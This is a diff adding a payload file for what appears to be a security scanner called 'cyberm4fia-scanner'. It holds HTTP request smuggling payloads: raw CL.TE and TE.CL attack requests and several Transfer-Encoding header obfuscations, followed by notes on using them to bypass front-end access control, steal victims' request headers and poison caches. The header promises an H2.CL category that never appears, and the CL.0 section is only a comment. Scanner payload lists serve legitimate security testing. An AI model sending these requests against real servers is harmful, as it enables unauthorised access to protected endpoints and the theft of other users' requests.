@@ -1,0 +1,48 @@
+# HTTP Request Smuggling Payloads — cyberm4fia-scanner
+# Categories: CL.TE, TE.CL, TE.TE, H2.CL
+
+# ─── CL.TE (frontend CL, backend TE) ───
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+# ─── TE.CL (frontend TE, backend CL) ───
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Host: target.com
+Content-Length: 15
+
+x=1
+0
+
+
+# ─── TE.TE Obfuscation ───
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:chunked
+Transfer-Encoding: x
+
+Transfer-Encoding : chunked
+Transfer-Encoding: "chunked"
+
+Transfer-encoding: cow
+ Transfer-Encoding: chunked
+
+# ─── CL.0 ───
+# Frontend forwards CL bytes, backend ignores body
+
+# ─── Impact Patterns ───
+# - Bypass front-end auth/ACL (smuggle GET /admin)
+# - Queue poisoning (steal victim request headers)
+# - Cache poisoning via smuggled Host
